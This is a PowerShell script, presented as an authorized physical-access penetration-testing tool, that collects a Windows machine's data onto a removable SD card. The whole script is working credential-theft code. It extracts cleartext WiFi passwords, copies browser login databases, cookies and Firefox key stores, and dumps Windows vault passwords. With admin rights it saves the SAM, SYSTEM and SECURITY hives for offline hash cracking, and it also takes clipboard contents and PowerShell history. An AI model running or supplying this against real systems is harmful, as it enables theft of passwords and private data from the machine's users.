#Requires -Version 3.0
<#
.SYNOPSIS
    FLLC - Windows Data Collector
    Authorized Penetration Testing - Physical Access Engagement

.DESCRIPTION
    Collects system information, network config, credentials, browser data,
    and other artifacts from a Windows target. All data saved to the
    MICRO SD card (data dump drive).

.NOTES
    AUTHORIZED USE ONLY - Requires explicit written permission.
    FLLC
#>

# ============================================================================
#  CONFIGURATION
# ============================================================================

$ErrorActionPreference = "SilentlyContinue"

# Auto-detect the drive this script is running from
$ScriptDrive = Split-Path -Qualifier $PSScriptRoot
if (-not $ScriptDrive) { $ScriptDrive = "I:" }

# Output directory with timestamp
$Timestamp = Get-Date -Format "yyyyMMdd_HHmmss"
$Hostname = $env:COMPUTERNAME
$OutputDir = "$ScriptDrive\collected\${Hostname}_${Timestamp}"

# Create output structure
$Dirs = @(
    "$OutputDir\system",
    "$OutputDir\network",
    "$OutputDir\users",
    "$OutputDir\browsers",
    "$OutputDir\credentials",
    "$OutputDir\documents",
    "$OutputDir\software",
    "$OutputDir\tasks",
    "$OutputDir\logs"
)
foreach ($d in $Dirs) {
    New-Item -ItemType Directory -Path $d -Force | Out-Null
}

# Log file
$LogFile = "$OutputDir\collection.log"

function Write-Log {
    param([string]$Message)
    $ts = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    "$ts | $Message" | Out-File -Append -FilePath $LogFile
}

Write-Log "=== FLLC DATA COLLECTION STARTED ==="
Write-Log "Target: $Hostname"
Write-Log "Output: $OutputDir"

# ============================================================================
#  PHASE 1: SYSTEM INFORMATION
# ============================================================================

Write-Log "PHASE 1: System Information"

# Basic system info
$sysinfo = @{
    Hostname       = $env:COMPUTERNAME
    Username       = $env:USERNAME
    Domain         = $env:USERDOMAIN
    OS             = (Get-WmiObject Win32_OperatingSystem).Caption
    OSVersion      = (Get-WmiObject Win32_OperatingSystem).Version
    OSArch         = (Get-WmiObject Win32_OperatingSystem).OSArchitecture
    InstallDate    = (Get-WmiObject Win32_OperatingSystem).InstallDate
    LastBoot       = (Get-WmiObject Win32_OperatingSystem).LastBootUpTime
    SystemModel    = (Get-WmiObject Win32_ComputerSystem).Model
    Manufacturer   = (Get-WmiObject Win32_ComputerSystem).Manufacturer
    TotalRAM_GB    = [math]::Round((Get-WmiObject Win32_ComputerSystem).TotalPhysicalMemory / 1GB, 2)
    Processor      = (Get-WmiObject Win32_Processor).Name
    SerialNumber   = (Get-WmiObject Win32_BIOS).SerialNumber
    IsAdmin        = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
    Timestamp      = Get-Date -Format "o"
}
$sysinfo | ConvertTo-Json -Depth 5 | Out-File "$OutputDir\system\systeminfo.json"

# Full systeminfo output
systeminfo | Out-File "$OutputDir\system\systeminfo_full.txt"

# Environment variables
Get-ChildItem Env: | Format-Table -AutoSize | Out-File "$OutputDir\system\environment.txt"

# Running processes
Get-Process | Select-Object Id, ProcessName, Path, Company, CPU, WorkingSet64 |
    Export-Csv "$OutputDir\system\processes.csv" -NoTypeInformation

# Services
Get-Service | Select-Object Name, DisplayName, Status, StartType |
    Export-Csv "$OutputDir\system\services.csv" -NoTypeInformation

# Startup items
Get-CimInstance Win32_StartupCommand | Select-Object Name, Command, Location, User |
    Export-Csv "$OutputDir\system\startup.csv" -NoTypeInformation

# Drives and disk info
Get-WmiObject Win32_LogicalDisk | Select-Object DeviceID, VolumeName, FileSystem, Size, FreeSpace |
    Export-Csv "$OutputDir\system\drives.csv" -NoTypeInformation

# Hotfixes/patches
Get-HotFix | Select-Object HotFixID, Description, InstalledOn |
    Export-Csv "$OutputDir\system\hotfixes.csv" -NoTypeInformation

Write-Log "  System info collected"

# ============================================================================
#  PHASE 2: NETWORK INFORMATION
# ============================================================================

Write-Log "PHASE 2: Network Information"

# IP configuration
ipconfig /all | Out-File "$OutputDir\network\ipconfig.txt"

# ARP table
arp -a | Out-File "$OutputDir\network\arp.txt"

# Routing table
route print | Out-File "$OutputDir\network\routes.txt"

# DNS cache
ipconfig /displaydns | Out-File "$OutputDir\network\dns_cache.txt"

# Active connections
netstat -ano | Out-File "$OutputDir\network\netstat.txt"
netstat -anob 2>$null | Out-File "$OutputDir\network\netstat_programs.txt"

# Firewall rules
netsh advfirewall firewall show rule name=all | Out-File "$OutputDir\network\firewall_rules.txt"

# WiFi profiles
netsh wlan show profiles | Out-File "$OutputDir\network\wifi_profiles.txt"

# WiFi passwords - extract saved passwords for each profile
$profiles = netsh wlan show profiles | Select-String "All User Profile" | ForEach-Object {
    ($_ -split ":")[-1].Trim()
}
$wifiCreds = @()
foreach ($profile in $profiles) {
    if ($profile) {
        $detail = netsh wlan show profile name="$profile" key=clear 2>$null
        $password = ($detail | Select-String "Key Content" | ForEach-Object {
            ($_ -split ":")[-1].Trim()
        })
        $wifiCreds += [PSCustomObject]@{
            SSID     = $profile
            Password = if ($password) { $password } else { "[not stored]" }
        }
        $detail | Out-File "$OutputDir\network\wifi_${profile}.txt"
    }
}
$wifiCreds | Export-Csv "$OutputDir\network\wifi_passwords.csv" -NoTypeInformation

# Network shares
net share | Out-File "$OutputDir\network\shares.txt"
net use | Out-File "$OutputDir\network\mapped_drives.txt"

# Hosts file
if (Test-Path "C:\Windows\System32\drivers\etc\hosts") {
    Copy-Item "C:\Windows\System32\drivers\etc\hosts" "$OutputDir\network\hosts.txt"
}

Write-Log "  Network info collected (${($wifiCreds.Count)} WiFi profiles)"

# ============================================================================
#  PHASE 3: USER INFORMATION
# ============================================================================

Write-Log "PHASE 3: User Information"

# Local users
Get-LocalUser | Select-Object Name, Enabled, LastLogon, PasswordLastSet, Description |
    Export-Csv "$OutputDir\users\local_users.csv" -NoTypeInformation

# Local groups
Get-LocalGroup | Select-Object Name, Description |
    Export-Csv "$OutputDir\users\local_groups.csv" -NoTypeInformation

# Admin group members
Get-LocalGroupMember -Group "Administrators" 2>$null |
    Select-Object Name, ObjectClass, PrincipalSource |
    Export-Csv "$OutputDir\users\administrators.csv" -NoTypeInformation

# User profiles on disk
Get-ChildItem C:\Users -Directory | Select-Object Name, CreationTime, LastWriteTime |
    Export-Csv "$OutputDir\users\user_profiles.csv" -NoTypeInformation

# Current user details
whoami /all | Out-File "$OutputDir\users\whoami.txt"

# Recent logon events (if accessible)
try {
    Get-EventLog -LogName Security -InstanceId 4624 -Newest 50 2>$null |
        Select-Object TimeGenerated, Message |
        Export-Csv "$OutputDir\users\recent_logons.csv" -NoTypeInformation
} catch {}

Write-Log "  User info collected"

# ============================================================================
#  PHASE 4: BROWSER DATA
# ============================================================================

Write-Log "PHASE 4: Browser Data"

$UserProfiles = Get-ChildItem C:\Users -Directory

foreach ($profile in $UserProfiles) {
    $user = $profile.Name
    $browserDir = "$OutputDir\browsers\$user"
    New-Item -ItemType Directory -Path $browserDir -Force | Out-Null

    # Chrome
    $chromePath = "$($profile.FullName)\AppData\Local\Google\Chrome\User Data\Default"
    if (Test-Path $chromePath) {
        New-Item -ItemType Directory -Path "$browserDir\chrome" -Force | Out-Null
        # History (SQLite DB)
        if (Test-Path "$chromePath\History") {
            Copy-Item "$chromePath\History" "$browserDir\chrome\History.db" -Force
        }
        # Bookmarks (JSON)
        if (Test-Path "$chromePath\Bookmarks") {
            Copy-Item "$chromePath\Bookmarks" "$browserDir\chrome\Bookmarks.json" -Force
        }
        # Login Data (SQLite DB - encrypted passwords)
        if (Test-Path "$chromePath\Login Data") {
            Copy-Item "$chromePath\Login Data" "$browserDir\chrome\LoginData.db" -Force
        }
        # Cookies
        if (Test-Path "$chromePath\Cookies") {
            Copy-Item "$chromePath\Cookies" "$browserDir\chrome\Cookies.db" -Force
        }
        # Preferences
        if (Test-Path "$chromePath\Preferences") {
            Copy-Item "$chromePath\Preferences" "$browserDir\chrome\Preferences.json" -Force
        }
    }

    # Firefox
    $firefoxPath = "$($profile.FullName)\AppData\Roaming\Mozilla\Firefox\Profiles"
    if (Test-Path $firefoxPath) {
        $ffProfiles = Get-ChildItem $firefoxPath -Directory
        foreach ($ffProfile in $ffProfiles) {
            $ffDir = "$browserDir\firefox\$($ffProfile.Name)"
            New-Item -ItemType Directory -Path $ffDir -Force | Out-Null
            # Key databases
            @("places.sqlite", "logins.json", "key4.db", "cookies.sqlite",
              "formhistory.sqlite", "permissions.sqlite") | ForEach-Object {
                if (Test-Path "$($ffProfile.FullName)\$_") {
                    Copy-Item "$($ffProfile.FullName)\$_" "$ffDir\$_" -Force
                }
            }
        }
    }

    # Edge (Chromium)
    $edgePath = "$($profile.FullName)\AppData\Local\Microsoft\Edge\User Data\Default"
    if (Test-Path $edgePath) {
        New-Item -ItemType Directory -Path "$browserDir\edge" -Force | Out-Null
        @("History", "Bookmarks", "Login Data", "Cookies", "Preferences") | ForEach-Object {
            if (Test-Path "$edgePath\$_") {
                Copy-Item "$edgePath\$_" "$browserDir\edge\$($_ -replace ' ','_').db" -Force
            }
        }
    }
}

Write-Log "  Browser data collected"

# ============================================================================
#  PHASE 5: CREDENTIALS
# ============================================================================

Write-Log "PHASE 5: Credentials"

# Windows Credential Manager
cmdkey /list | Out-File "$OutputDir\credentials\credential_manager.txt"

# Vault credentials
try {
    [Windows.Security.Credentials.PasswordVault, Windows.Security.Credentials, ContentType = WindowsRuntime] | Out-Null
    $vault = New-Object Windows.Security.Credentials.PasswordVault
    $creds = $vault.RetrieveAll()
    $vaultData = @()
    foreach ($c in $creds) {
        try {
            $c.RetrievePassword()
            $vaultData += [PSCustomObject]@{
                Resource = $c.Resource
                UserName = $c.UserName
                Password = $c.Password
            }
        } catch {
            $vaultData += [PSCustomObject]@{
                Resource = $c.Resource
                UserName = $c.UserName
                Password = "[protected]"
            }
        }
    }
    $vaultData | Export-Csv "$OutputDir\credentials\vault_credentials.csv" -NoTypeInformation
} catch {}

# Saved RDP connections
Get-ItemProperty "HKCU:\Software\Microsoft\Terminal Server Client\Servers\*" 2>$null |
    Select-Object PSChildName, UsernameHint |
    Export-Csv "$OutputDir\credentials\rdp_connections.csv" -NoTypeInformation

# PuTTY saved sessions
Get-ItemProperty "HKCU:\Software\SimonTatham\PuTTY\Sessions\*" 2>$null |
    Select-Object PSChildName, HostName, UserName, PortNumber, Protocol |
    Export-Csv "$OutputDir\credentials\putty_sessions.csv" -NoTypeInformation

# SAM/SYSTEM hive backup (requires admin)
if ($sysinfo.IsAdmin) {
    try {
        reg save HKLM\SAM "$OutputDir\credentials\SAM.hive" /y 2>$null
        reg save HKLM\SYSTEM "$OutputDir\credentials\SYSTEM.hive" /y 2>$null
        reg save HKLM\SECURITY "$OutputDir\credentials\SECURITY.hive" /y 2>$null
        Write-Log "  SAM/SYSTEM/SECURITY hives exported (admin)"
    } catch {}
}

# LSA secrets registry
reg query "HKLM\SECURITY\Policy\Secrets" 2>$null | Out-File "$OutputDir\credentials\lsa_secrets_keys.txt"

Write-Log "  Credentials collected"

# ============================================================================
#  PHASE 6: DOCUMENTS & FILES
# ============================================================================

Write-Log "PHASE 6: Documents & Files"

# Recent files
Get-ChildItem "$env:APPDATA\Microsoft\Windows\Recent" -File 2>$null |
    Select-Object Name, LastWriteTime |
    Export-Csv "$OutputDir\documents\recent_files.csv" -NoTypeInformation

# Desktop files listing
foreach ($profile in $UserProfiles) {
    $desktop = "$($profile.FullName)\Desktop"
    if (Test-Path $desktop) {
        Get-ChildItem $desktop -Recurse -File 2>$null |
            Select-Object FullName, Length, LastWriteTime, Extension |
            Export-Csv "$OutputDir\documents\desktop_$($profile.Name).csv" -NoTypeInformation
    }

    # Documents folder listing
    $docs = "$($profile.FullName)\Documents"
    if (Test-Path $docs) {
        Get-ChildItem $docs -Recurse -File -Depth 3 2>$null |
            Select-Object FullName, Length, LastWriteTime, Extension |
            Export-Csv "$OutputDir\documents\documents_$($profile.Name).csv" -NoTypeInformation
    }

    # Downloads folder listing
    $downloads = "$($profile.FullName)\Downloads"
    if (Test-Path $downloads) {
        Get-ChildItem $downloads -Recurse -File -Depth 2 2>$null |
            Select-Object FullName, Length, LastWriteTime, Extension |
            Export-Csv "$OutputDir\documents\downloads_$($profile.Name).csv" -NoTypeInformation
    }
}

# Clipboard contents
try {
    Add-Type -AssemblyName System.Windows.Forms
    $clipText = [System.Windows.Forms.Clipboard]::GetText()
    if ($clipText) {
        $clipText | Out-File "$OutputDir\documents\clipboard.txt"
    }
} catch {}

# PowerShell history
foreach ($profile in $UserProfiles) {
    $psHistory = "$($profile.FullName)\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
    if (Test-Path $psHistory) {
        Copy-Item $psHistory "$OutputDir\documents\ps_history_$($profile.Name).txt"
    }
}

Write-Log "  Documents & files collected"

# ============================================================================
#  PHASE 7: SOFTWARE INVENTORY
# ============================================================================

Write-Log "PHASE 7: Software Inventory"

# Installed software (64-bit)
Get-ItemProperty "HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*" 2>$null |
    Select-Object DisplayName, DisplayVersion, Publisher, InstallDate |
    Where-Object { $_.DisplayName } |
    Export-Csv "$OutputDir\software\installed_x64.csv" -NoTypeInformation

# Installed software (32-bit)
Get-ItemProperty "HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" 2>$null |
    Select-Object DisplayName, DisplayVersion, Publisher, InstallDate |
    Where-Object { $_.DisplayName } |
    Export-Csv "$OutputDir\software\installed_x86.csv" -NoTypeInformation

# Installed Windows features
Get-WindowsOptionalFeature -Online 2>$null |
    Where-Object { $_.State -eq "Enabled" } |
    Select-Object FeatureName |
    Export-Csv "$OutputDir\software\windows_features.csv" -NoTypeInformation

Write-Log "  Software inventory collected"

# ============================================================================
#  PHASE 8: SCHEDULED TASKS
# ============================================================================

Write-Log "PHASE 8: Scheduled Tasks"

Get-ScheduledTask 2>$null |
    Where-Object { $_.State -ne "Disabled" } |
    Select-Object TaskName, TaskPath, State, @{N="Action";E={$_.Actions.Execute}} |
    Export-Csv "$OutputDir\tasks\scheduled_tasks.csv" -NoTypeInformation

schtasks /query /fo CSV /v 2>$null | Out-File "$OutputDir\tasks\schtasks_full.csv"

Write-Log "  Scheduled tasks collected"

# ============================================================================
#  PHASE 9: EVENT LOGS
# ============================================================================

Write-Log "PHASE 9: Event Logs (recent)"

# Security events (last 100)
try {
    Get-WinEvent -LogName Security -MaxEvents 100 2>$null |
        Select-Object TimeCreated, Id, LevelDisplayName, Message |
        Export-Csv "$OutputDir\logs\security_events.csv" -NoTypeInformation
} catch {}

# System events (last 100)
try {
    Get-WinEvent -LogName System -MaxEvents 100 2>$null |
        Select-Object TimeCreated, Id, LevelDisplayName, Message |
        Export-Csv "$OutputDir\logs\system_events.csv" -NoTypeInformation
} catch {}

# Application events (last 50)
try {
    Get-WinEvent -LogName Application -MaxEvents 50 2>$null |
        Select-Object TimeCreated, Id, LevelDisplayName, Message |
        Export-Csv "$OutputDir\logs\application_events.csv" -NoTypeInformation
} catch {}

# PowerShell events (last 50)
try {
    Get-WinEvent -LogName "Microsoft-Windows-PowerShell/Operational" -MaxEvents 50 2>$null |
        Select-Object TimeCreated, Id, Message |
        Export-Csv "$OutputDir\logs\powershell_events.csv" -NoTypeInformation
} catch {}

Write-Log "  Event logs collected"

# ============================================================================
#  FINALIZE
# ============================================================================

Write-Log "=== COLLECTION COMPLETE ==="

# Generate summary
$fileCount = (Get-ChildItem $OutputDir -Recurse -File).Count
$totalSize = (Get-ChildItem $OutputDir -Recurse -File | Measure-Object -Property Length -Sum).Sum
$sizeMB = [math]::Round($totalSize / 1MB, 2)

$summary = @"
============================================
FLLC - DATA COLLECTION SUMMARY
============================================
Target:      $Hostname
User:        $env:USERNAME
Domain:      $env:USERDOMAIN
Admin:       $($sysinfo.IsAdmin)
Timestamp:   $Timestamp
Files:       $fileCount
Total Size:  $sizeMB MB
Output:      $OutputDir
============================================
"@

$summary | Out-File "$OutputDir\SUMMARY.txt"
Write-Log $summary
